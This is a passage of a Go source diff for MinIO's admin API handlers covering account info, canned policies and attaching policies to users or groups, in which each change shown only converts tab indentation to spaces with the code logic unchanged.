r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\teffectivePolicy = globalIAMSys.GetCombinedPolicy(policies...)\n-\n-\t}\n-\tbuf, err = json.MarshalIndent(effectivePolicy, \"\", \" \")\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tacctInfo := madmin.AccountInfo{\n-\t\tAccountName: accountName,\n-\t\tServer:      objectAPI.BackendInfo(),\n-\t\tPolicy:      buf,\n-\t}\n-\n-\tfor _, bucket := range buckets {\n-\t\trd, wr := isAllowedAccess(bucket.Name)\n-\t\tif rd || wr {\n-\t\t\t// Fetch the data usage of the current bucket\n-\t\t\tvar size uint64\n-\t\t\tvar objectsCount uint64\n-\t\t\tvar objectsHist, versionsHist map[string]uint64\n-\t\t\tif !dataUsageInfo.LastUpdate.IsZero() {\n-\t\t\t\tsize = dataUsageInfo.BucketsUsage[bucket.Name].Size\n-\t\t\t\tobjectsCount = dataUsageInfo.BucketsUsage[bucket.Name].ObjectsCount\n-\t\t\t\tobjectsHist = dataUsageInfo.BucketsUsage[bucket.Name].ObjectSizesHistogram\n-\t\t\t\tversionsHist = dataUsageInfo.BucketsUsage[bucket.Name].ObjectVersionsHistogram\n-\t\t\t}\n-\t\t\t// Fetch the prefix usage of the current bucket\n-\t\t\tvar prefixUsage map[string]uint64\n-\t\t\tif enablePrefixUsage {\n-\t\t\t\tprefixUsage, _ = loadPrefixUsageFromBackend(ctx, objectAPI, bucket.Name)\n-\t\t\t}\n-\n-\t\t\tlcfg, _ := globalBucketObjectLockSys.Get(bucket.Name)\n-\t\t\tquota, _ := globalBucketQuotaSys.Get(ctx, bucket.Name)\n-\t\t\trcfg, _, _ := globalBucketMetadataSys.GetReplicationConfig(ctx, bucket.Name)\n-\t\t\ttcfg, _, _ := globalBucketMetadataSys.GetTaggingConfig(bucket.Name)\n-\n-\t\t\tacctInfo.Buckets = append(acctInfo.Buckets, madmin.BucketAccessInfo{\n-\t\t\t\tName:                    bucket.Name,\n-\t\t\t\tCreated:                 bucket.Created,\n-\t\t\t\tSize:                    size,\n-\t\t\t\tObjects:                 objectsCount,\n-\t\t\t\tObjectSizesHistogram:    objectsHist,\n-\t\t\t\tObjectVersionsHistogram: versionsHist,\n-\t\t\t\tPrefixUsage:             prefixUsage,\n-\t\t\t\tDetails: &madmin.BucketDetails{\n-\t\t\t\t\tVersioning:          globalBucketVersioningSys.Enabled(bucket.Name),\n-\t\t\t\t\tVersioningSuspended: globalBucketVersioningSys.Suspended(bucket.Name),\n-\t\t\t\t\tReplication:         rcfg != nil,\n-\t\t\t\t\tLocking:             lcfg.LockEnabled,\n-\t\t\t\t\tQuota:               quota,\n-\t\t\t\t\tTagging:             tcfg,\n-\t\t\t\t},\n-\t\t\t\tAccess: madmin.AccountAccess{\n-\t\t\t\t\tRead:  rd,\n-\t\t\t\t\tWrite: wr,\n-\t\t\t\t},\n-\t\t\t})\n-\t\t}\n-\t}\n-\n-\tusageInfoJSON, err := json.Marshal(acctInfo)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\twriteSuccessResponseJSON(w, usageInfoJSON)\n+        ctx := r.Context()\n+\n+        // Get current object layer instance.\n+        objectAPI := newObjectLayerFn()\n+        if objectAPI == nil || globalNotificationSys == nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n+                return\n+        }\n+\n+        cred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n+        if s3Err != ErrNone {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n+                return\n+        }\n+\n+        // Set prefix value for \"s3:prefix\" policy conditionals.\n+        r.Header.Set(\"prefix\", \"\")\n+\n+        // Set delimiter value for \"s3:delimiter\" policy conditionals.\n+        r.Header.Set(\"delimiter\", SlashSeparator)\n+\n+        // Check if we are asked to return prefix usage\n+        enablePrefixUsage := r.Form.Get(\"prefix-usage\") == \"true\"\n+\n+        isAllowedAccess := func(bucketName string) (rd, wr bool) {\n+                if globalIAMSys.IsAllowed(policy.Args{\n+                        AccountName:     cred.AccessKey,\n+                        Groups:          cred.Groups,\n+                        Action:          policy.ListBucketAction,\n+                        BucketName:      bucketName,\n+                        ConditionValues: getConditionValues(r, \"\", cred),\n+                        IsOwner:         owner,\n+                        ObjectName:      \"\",\n+                        Claims:          cred.Claims,\n+                }) {\n+                        rd = true\n+                }\n+\n+                if globalIAMSys.IsAllowed(policy.Args{\n+                        AccountName:     cred.AccessKey,\n+                        Groups:          cred.Groups,\n+                        Action:          policy.GetBucketLocationAction,\n+                        BucketName:      bucketName,\n+                        ConditionValues: getConditionValues(r, \"\", cred),\n+                        IsOwner:         owner,\n+                        ObjectName:      \"\",\n+                        Claims:          cred.Claims,\n+                }) {\n+                        rd = true\n+                }\n+\n+                if globalIAMSys.IsAllowed(policy.Args{\n+                        AccountName:     cred.AccessKey,\n+                        Groups:          cred.Groups,\n+                        Action:          policy.PutObjectAction,\n+                        BucketName:      bucketName,\n+                        ConditionValues: getConditionValues(r, \"\", cred),\n+                        IsOwner:         owner,\n+                        ObjectName:      \"\",\n+                        Claims:          cred.Claims,\n+                }) {\n+                        wr = true\n+                }\n+\n+                return rd, wr\n+        }\n+\n+        bucketStorageCache.Once.Do(func() {\n+                // Set this to 10 secs since its enough, as scanner\n+                // does not update the bucket usage values frequently.\n+                bucketStorageCache.TTL = 10 * time.Second\n+\n+                // Rely on older value if usage loading fails from disk.\n+                bucketStorageCache.Relax = true\n+                bucketStorageCache.Update = func() (interface{}, error) {\n+                        ctx, done := context.WithTimeout(context.Background(), 2*time.Second)\n+                        defer done()\n+\n+                        return loadDataUsageFromBackend(ctx, objectAPI)\n+                }\n+        })\n+\n+        var dataUsageInfo DataUsageInfo\n+        v, _ := bucketStorageCache.Get()\n+        if v != nil {\n+                dataUsageInfo, _ = v.(DataUsageInfo)\n+        }\n+\n+        // If etcd, dns federation configured list buckets from etcd.\n+        var err error\n+        var buckets []BucketInfo\n+        if globalDNSConfig != nil && globalBucketFederation {\n+                dnsBuckets, err := globalDNSConfig.List()\n+                if err != nil && !IsErrIgnored(err,\n+                        dns.ErrNoEntriesFound,\n+                        dns.ErrDomainMissing) {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+                for _, dnsRecords := range dnsBuckets {\n+                        buckets = append(buckets, BucketInfo{\n+                                Name:    dnsRecords[0].Key,\n+                                Created: dnsRecords[0].CreationDate,\n+                        })\n+                }\n+                sort.Slice(buckets, func(i, j int) bool {\n+                        return buckets[i].Name < buckets[j].Name\n+                })\n+        } else {\n+                buckets, err = objectAPI.ListBuckets(ctx, BucketOptions{Cached: true})\n+                if err != nil {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+        }\n+\n+        accountName := cred.AccessKey\n+        if cred.IsTemp() || cred.IsServiceAccount() {\n+                // For derived credentials, check the parent user's permissions.\n+                accountName = cred.ParentUser\n+        }\n+\n+        roleArn := policy.Args{Claims: cred.Claims}.GetRoleArn()\n+        policySetFromClaims, hasPolicyClaim := policy.GetPoliciesFromClaims(cred.Claims, iamPolicyClaimNameOpenID())\n+        var effectivePolicy policy.Policy\n+\n+        var buf []byte\n+        switch {\n+        case accountName == globalActiveCred.AccessKey:\n+                for _, policy := range policy.DefaultPolicies {\n+                        if policy.Name == \"consoleAdmin\" {\n+                                effectivePolicy = policy.Definition\n+                                break\n+                        }\n+                }\n+\n+        case roleArn != \"\":\n+                _, policy, err := globalIAMSys.GetRolePolicy(roleArn)\n+                if err != nil {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+                policySlice := newMappedPolicy(policy).toSlice()\n+                effectivePolicy = globalIAMSys.GetCombinedPolicy(policySlice...)\n+\n+        case hasPolicyClaim:\n+                effectivePolicy = globalIAMSys.GetCombinedPolicy(policySetFromClaims.ToSlice()...)\n+\n+        default:\n+                policies, err := globalIAMSys.PolicyDBGet(accountName, cred.Groups...)\n+                if err != nil {\n+                        logger.LogIf(ctx, err)\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+                effectivePolicy = globalIAMSys.GetCombinedPolicy(policies...)\n+\n+        }\n+        buf, err = json.MarshalIndent(effectivePolicy, \"\", \" \")\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        acctInfo := madmin.AccountInfo{\n+                AccountName: accountName,\n+                Server:      objectAPI.BackendInfo(),\n+                Policy:      buf,\n+        }\n+\n+        for _, bucket := range buckets {\n+                rd, wr := isAllowedAccess(bucket.Name)\n+                if rd || wr {\n+                        // Fetch the data usage of the current bucket\n+                        var size uint64\n+                        var objectsCount uint64\n+                        var objectsHist, versionsHist map[string]uint64\n+                        if !dataUsageInfo.LastUpdate.IsZero() {\n+                                size = dataUsageInfo.BucketsUsage[bucket.Name].Size\n+                                objectsCount = dataUsageInfo.BucketsUsage[bucket.Name].ObjectsCount\n+                                objectsHist = dataUsageInfo.BucketsUsage[bucket.Name].ObjectSizesHistogram\n+                                versionsHist = dataUsageInfo.BucketsUsage[bucket.Name].ObjectVersionsHistogram\n+                        }\n+                        // Fetch the prefix usage of the current bucket\n+                        var prefixUsage map[string]uint64\n+                        if enablePrefixUsage {\n+                                prefixUsage, _ = loadPrefixUsageFromBackend(ctx, objectAPI, bucket.Name)\n+                        }\n+\n+                        lcfg, _ := globalBucketObjectLockSys.Get(bucket.Name)\n+                        quota, _ := globalBucketQuotaSys.Get(ctx, bucket.Name)\n+                        rcfg, _, _ := globalBucketMetadataSys.GetReplicationConfig(ctx, bucket.Name)\n+                        tcfg, _, _ := globalBucketMetadataSys.GetTaggingConfig(bucket.Name)\n+\n+                        acctInfo.Buckets = append(acctInfo.Buckets, madmin.BucketAccessInfo{\n+                                Name:                    bucket.Name,\n+                                Created:                 bucket.Created,\n+                                Size:                    size,\n+                                Objects:                 objectsCount,\n+                                ObjectSizesHistogram:    objectsHist,\n+                                ObjectVersionsHistogram: versionsHist,\n+                                PrefixUsage:             prefixUsage,\n+                                Details: &madmin.BucketDetails{\n+                                        Versioning:          globalBucketVersioningSys.Enabled(bucket.Name),\n+                                        VersioningSuspended: globalBucketVersioningSys.Suspended(bucket.Name),\n+                                        Replication:         rcfg != nil,\n+                                        Locking:             lcfg.LockEnabled,\n+                                        Quota:               quota,\n+                                        Tagging:             tcfg,\n+                                },\n+                                Access: madmin.AccountAccess{\n+                                        Read:  rd,\n+                                        Write: wr,\n+                                },\n+                        })\n+                }\n+        }\n+\n+        usageInfoJSON, err := json.Marshal(acctInfo)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        writeSuccessResponseJSON(w, usageInfoJSON)\n }\n \n // InfoCannedPolicy - GET /minio/admin/v3/info-canned-policy?name={policyName}\n@@ -1353,1145 +1546,1145 @@ func (a adminAPIHandlers) AccountInfoHandler(w http.ResponseWriter, r *http.Requ\n // timestamps along with the policy JSON. Both versions are supported for now,\n // for smooth transition to new API.\n func (a adminAPIHandlers) InfoCannedPolicy(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, _ := validateAdminReq(ctx, w, r, policy.GetPolicyAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tname := mux.Vars(r)[\"name\"]\n-\tpolicies := newMappedPolicy(name).toSlice()\n-\tif len(policies) != 1 {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errTooManyPolicies), r.URL)\n-\t\treturn\n-\t}\n-\n-\tpolicyDoc, err := globalIAMSys.InfoPolicy(name)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Is the new API version being requested?\n-\tinfoPolicyAPIVersion := r.Form.Get(\"v\")\n-\tif infoPolicyAPIVersion == \"2\" {\n-\t\tbuf, err := json.MarshalIndent(policyDoc, \"\", \" \")\n-\t\tif err != nil {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\tw.Write(buf)\n-\t\treturn\n-\t} else if infoPolicyAPIVersion != \"\" {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errors.New(\"invalid version parameter 'v' supplied\")), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Return the older API response value of just the policy json.\n-\tbuf, err := json.MarshalIndent(policyDoc.Policy, \"\", \" \")\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\tw.Write(buf)\n+        ctx := r.Context()\n+\n+        objectAPI, _ := validateAdminReq(ctx, w, r, policy.GetPolicyAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        name := mux.Vars(r)[\"name\"]\n+        policies := newMappedPolicy(name).toSlice()\n+        if len(policies) != 1 {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errTooManyPolicies), r.URL)\n+                return\n+        }\n+\n+        policyDoc, err := globalIAMSys.InfoPolicy(name)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        // Is the new API version being requested?\n+        infoPolicyAPIVersion := r.Form.Get(\"v\")\n+        if infoPolicyAPIVersion == \"2\" {\n+                buf, err := json.MarshalIndent(policyDoc, \"\", \" \")\n+                if err != nil {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+                w.Write(buf)\n+                return\n+        } else if infoPolicyAPIVersion != \"\" {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errors.New(\"invalid version parameter 'v' supplied\")), r.URL)\n+                return\n+        }\n+\n+        // Return the older API response value of just the policy json.\n+        buf, err := json.MarshalIndent(policyDoc.Policy, \"\", \" \")\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+        w.Write(buf)\n }\n \n // ListBucketPolicies - GET /minio/admin/v3/list-canned-policies?bucket={bucket}\n func (a adminAPIHandlers) ListBucketPolicies(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, _ := validateAdminReq(ctx, w, r, policy.ListUserPoliciesAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tbucket := mux.Vars(r)[\"bucket\"]\n-\tpolicies, err := globalIAMSys.ListPolicies(ctx, bucket)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tnewPolicies := make(map[string]policy.Policy)\n-\tfor name, p := range policies {\n-\t\t_, err = json.Marshal(p)\n-\t\tif err != nil {\n-\t\t\tlogger.LogIf(ctx, err)\n-\t\t\tcontinue\n-\t\t}\n-\t\tnewPolicies[name] = p\n-\t}\n-\tif err = json.NewEncoder(w).Encode(newPolicies); err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n+        ctx := r.Context()\n+\n+        objectAPI, _ := validateAdminReq(ctx, w, r, policy.ListUserPoliciesAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        bucket := mux.Vars(r)[\"bucket\"]\n+        policies, err := globalIAMSys.ListPolicies(ctx, bucket)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        newPolicies := make(map[string]policy.Policy)\n+        for name, p := range policies {\n+                _, err = json.Marshal(p)\n+                if err != nil {\n+                        logger.LogIf(ctx, err)\n+                        continue\n+                }\n+                newPolicies[name] = p\n+        }\n+        if err = json.NewEncoder(w).Encode(newPolicies); err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n }\n \n // ListCannedPolicies - GET /minio/admin/v3/list-canned-policies\n func (a adminAPIHandlers) ListCannedPolicies(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, _ := validateAdminReq(ctx, w, r, policy.ListUserPoliciesAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tpolicies, err := globalIAMSys.ListPolicies(ctx, \"\")\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tnewPolicies := make(map[string]policy.Policy)\n-\tfor name, p := range policies {\n-\t\t_, err = json.Marshal(p)\n-\t\tif err != nil {\n-\t\t\tlogger.LogIf(ctx, err)\n-\t\t\tcontinue\n-\t\t}\n-\t\tnewPolicies[name] = p\n-\t}\n-\tif err = json.NewEncoder(w).Encode(newPolicies); err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n+        ctx := r.Context()\n+\n+        objectAPI, _ := validateAdminReq(ctx, w, r, policy.ListUserPoliciesAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        policies, err := globalIAMSys.ListPolicies(ctx, \"\")\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        newPolicies := make(map[string]policy.Policy)\n+        for name, p := range policies {\n+                _, err = json.Marshal(p)\n+                if err != nil {\n+                        logger.LogIf(ctx, err)\n+                        continue\n+                }\n+                newPolicies[name] = p\n+        }\n+        if err = json.NewEncoder(w).Encode(newPolicies); err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n }\n \n // RemoveCannedPolicy - DELETE /minio/admin/v3/remove-canned-policy?name=<policy_name>\n func (a adminAPIHandlers) RemoveCannedPolicy(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, _ := validateAdminReq(ctx, w, r, policy.DeletePolicyAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tvars := mux.Vars(r)\n-\tpolicyName := vars[\"name\"]\n-\n-\tif err := globalIAMSys.DeletePolicy(ctx, policyName, true); err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Call cluster-replication policy creation hook to replicate policy deletion to\n-\t// other minio clusters.\n-\tlogger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n-\t\tType:      madmin.SRIAMItemPolicy,\n-\t\tName:      policyName,\n-\t\tUpdatedAt: UTCNow(),\n-\t}))\n+        ctx := r.Context()\n+\n+        objectAPI, _ := validateAdminReq(ctx, w, r, policy.DeletePolicyAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        vars := mux.Vars(r)\n+        policyName := vars[\"name\"]\n+\n+        if err := globalIAMSys.DeletePolicy(ctx, policyName, true); err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        // Call cluster-replication policy creation hook to replicate policy deletion to\n+        // other minio clusters.\n+        logger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n+                Type:      madmin.SRIAMItemPolicy,\n+                Name:      policyName,\n+                UpdatedAt: UTCNow(),\n+        }))\n }\n \n // AddCannedPolicy - PUT /minio/admin/v3/add-canned-policy?name=<policy_name>\n func (a adminAPIHandlers) AddCannedPolicy(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, _ := validateAdminReq(ctx, w, r, policy.CreatePolicyAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tvars := mux.Vars(r)\n-\tpolicyName := vars[\"name\"]\n-\n-\t// Policy has space characters in begin and end reject such inputs.\n-\tif hasSpaceBE(policyName) {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Error out if Content-Length is missing.\n-\tif r.ContentLength <= 0 {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrMissingContentLength), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Error out if Content-Length is beyond allowed size.\n-\tif r.ContentLength > maxBucketPolicySize {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrEntityTooLarge), r.URL)\n-\t\treturn\n-\t}\n-\n-\tiamPolicyBytes, err := io.ReadAll(io.LimitReader(r.Body, r.ContentLength))\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tiamPolicy, err := policy.ParseConfig(bytes.NewReader(iamPolicyBytes))\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Version in policy must not be empty\n-\tif iamPolicy.Version == \"\" {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrPolicyInvalidVersion), r.URL)\n-\t\treturn\n-\t}\n-\n-\tupdatedAt, err := globalIAMSys.SetPolicy(ctx, policyName, *iamPolicy)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Call cluster-replication policy creation hook to replicate policy to\n-\t// other minio clusters.\n-\tlogger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n-\t\tType:      madmin.SRIAMItemPolicy,\n-\t\tName:      policyName,\n-\t\tPolicy:    iamPolicyBytes,\n-\t\tUpdatedAt: updatedAt,\n-\t}))\n+        ctx := r.Context()\n+\n+        objectAPI, _ := validateAdminReq(ctx, w, r, policy.CreatePolicyAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        vars := mux.Vars(r)\n+        policyName := vars[\"name\"]\n+\n+        // Policy has space characters in begin and end reject such inputs.\n+        if hasSpaceBE(policyName) {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument), r.URL)\n+                return\n+        }\n+\n+        // Error out if Content-Length is missing.\n+        if r.ContentLength <= 0 {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrMissingContentLength), r.URL)\n+                return\n+        }\n+\n+        // Error out if Content-Length is beyond allowed size.\n+        if r.ContentLength > maxBucketPolicySize {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrEntityTooLarge), r.URL)\n+                return\n+        }\n+\n+        iamPolicyBytes, err := io.ReadAll(io.LimitReader(r.Body, r.ContentLength))\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        iamPolicy, err := policy.ParseConfig(bytes.NewReader(iamPolicyBytes))\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        // Version in policy must not be empty\n+        if iamPolicy.Version == \"\" {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrPolicyInvalidVersion), r.URL)\n+                return\n+        }\n+\n+        updatedAt, err := globalIAMSys.SetPolicy(ctx, policyName, *iamPolicy)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        // Call cluster-replication policy creation hook to replicate policy to\n+        // other minio clusters.\n+        logger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n+                Type:      madmin.SRIAMItemPolicy,\n+                Name:      policyName,\n+                Policy:    iamPolicyBytes,\n+                UpdatedAt: updatedAt,\n+        }))\n }\n \n // SetPolicyForUserOrGroup - PUT /minio/admin/v3/set-policy?policy=xxx&user-or-group=?[&is-group]\n func (a adminAPIHandlers) SetPolicyForUserOrGroup(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, _ := validateAdminReq(ctx, w, r, policy.AttachPolicyAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tvars := mux.Vars(r)\n-\tpolicyName := vars[\"policyName\"]\n-\tentityName := vars[\"userOrGroup\"]\n-\tisGroup := vars[\"isGroup\"] == \"true\"\n-\n-\tif !isGroup {\n-\t\tok, _, err := globalIAMSys.IsTempUser(entityName)\n-\t\tif err != nil && err != errNoSuchUser {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\tif ok {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\t// When the user is root credential you are not allowed to\n-\t\t// add policies for root user.\n-\t\tif entityName == globalActiveCred.AccessKey {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\t// Validate that user or group exists.\n-\tif !isGroup {\n-\t\tif globalIAMSys.GetUsersSysType() == MinIOUsersSysType {\n-\t\t\t_, ok := globalIAMSys.GetUser(ctx, entityName)\n-\t\t\tif !ok {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errNoSuchUser), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t}\n-\t} else {\n-\t\t_, err := globalIAMSys.GetGroupDescription(entityName)\n-\t\tif err != nil {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\tuserType := regUser\n-\tif globalIAMSys.GetUsersSysType() == LDAPUsersSysType {\n-\t\tuserType = stsUser\n-\t}\n-\n-\tupdatedAt, err := globalIAMSys.PolicyDBSet(ctx, entityName, policyName, userType, isGroup)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tlogger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n-\t\tType: madmin.SRIAMItemPolicyMapping,\n-\t\tPolicyMapping: &madmin.SRPolicyMapping{\n-\t\t\tUserOrGroup: entityName,\n-\t\t\tUserType:    int(userType),\n-\t\t\tIsGroup:     isGroup,\n-\t\t\tPolicy:      policyName,\n-\t\t},\n-\t\tUpdatedAt: updatedAt,\n-\t}))\n+        ctx := r.Context()\n+\n+        objectAPI, _ := validateAdminReq(ctx, w, r, policy.AttachPolicyAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        vars := mux.Vars(r)\n+        policyName := vars[\"policyName\"]\n+        entityName := vars[\"userOrGroup\"]\n+        isGroup := vars[\"isGroup\"] == \"true\"\n+\n+        if !isGroup {\n+                ok, _, err := globalIAMSys.IsTempUser(entityName)\n+                if err != nil && err != errNoSuchUser {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+                if ok {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n+                        return\n+                }\n+                // When the user is root credential you are not allowed to\n+                // add policies for root user.\n+                if entityName == globalActiveCred.AccessKey {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n+                        return\n+                }\n+        }\n+\n+        // Validate that user or group exists.\n+        if !isGroup {\n+                if globalIAMSys.GetUsersSysType() == MinIOUsersSysType {\n+                        _, ok := globalIAMSys.GetUser(ctx, entityName)\n+                        if !ok {\n+                                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errNoSuchUser), r.URL)\n+                                return\n+                        }\n+                }\n+        } else {\n+                _, err := globalIAMSys.GetGroupDescription(entityName)\n+                if err != nil {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+        }\n+\n+        userType := regUser\n+        if globalIAMSys.GetUsersSysType() == LDAPUsersSysType {\n+                userType = stsUser\n+        }\n+\n+        updatedAt, err := globalIAMSys.PolicyDBSet(ctx, entityName, policyName, userType, isGroup)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        logger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n+                Type: madmin.SRIAMItemPolicyMapping,\n+                PolicyMapping: &madmin.SRPolicyMapping{\n+                        UserOrGroup: entityName,\n+                        UserType:    int(userType),\n+                        IsGroup:     isGroup,\n+                        Policy:      policyName,\n+                },\n+                UpdatedAt: updatedAt,\n+        }))\n 